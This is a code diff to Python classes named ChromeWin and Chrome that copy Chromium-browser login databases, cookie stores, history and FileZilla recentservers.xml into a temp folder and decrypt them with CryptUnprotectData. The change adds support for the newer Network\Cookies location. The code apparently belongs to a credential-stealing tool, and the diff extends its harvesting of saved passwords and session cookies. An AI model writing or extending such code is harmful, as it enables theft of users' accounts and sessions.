@@ -109,10 +109,11 @@ class ChromeWin:
         for app, path in self.browser_paths.items():
             browser = f"{path}\\Default"
 
-            file2tmp(f"{browser}\\Login Data",     tmp_dir, f"{app}_Login.sql")
-            file2tmp(f"{browser}\\Cookies",        tmp_dir, f"{app}_Cookies.sql")
-            file2tmp(f"{browser}\\History",        tmp_dir, f"{app}_History.sql")
-            file2tmp(f"{path}\\recentservers.xml", tmp_dir, f"{app}_FTP.xml")
+            file2tmp(f"{browser}\\Login Data",       tmp_dir, f"{app}_Login.sql")
+            file2tmp(f"{browser}\\Network\\Cookies", tmp_dir, f"{app}_NetCookies.sql")
+            file2tmp(f"{browser}\\Cookies",          tmp_dir, f"{app}_Cookies.sql")
+            file2tmp(f"{browser}\\History",          tmp_dir, f"{app}_History.sql")
+            file2tmp(f"{path}\\recentservers.xml",   tmp_dir, f"{app}_FTP.xml")
 
     def get_key(self, browser_name):
         from win32crypt import CryptUnprotectData
@@ -277,14 +278,14 @@ class Chrome:
 
     def get_cookies(self):
         try:
-            self.cookies_dbs = {file for file in listdir(self.tmp_dir) if file.endswith("_Cookies.sql")}
+            self.cookies_dbs = {file for file in listdir(self.tmp_dir) if (file.endswith("_Cookies.sql") or file.endswith("_NetCookies.sql"))}
         except Exception:
             return {}
 
         data = {}
 
         for cookies_sql in self.cookies_dbs:
-            browser_name = cookies_sql.split("_Cookies.sql")[0]
+            browser_name = cookies_sql.split("_NetCookies.sql" if "_NetCookies.sql" in cookies_sql else "_Cookies.sql")[0]
             data[browser_name] = {}
 
             conn   = connect(f"{self.tmp_dir}/{cookies_sql}")
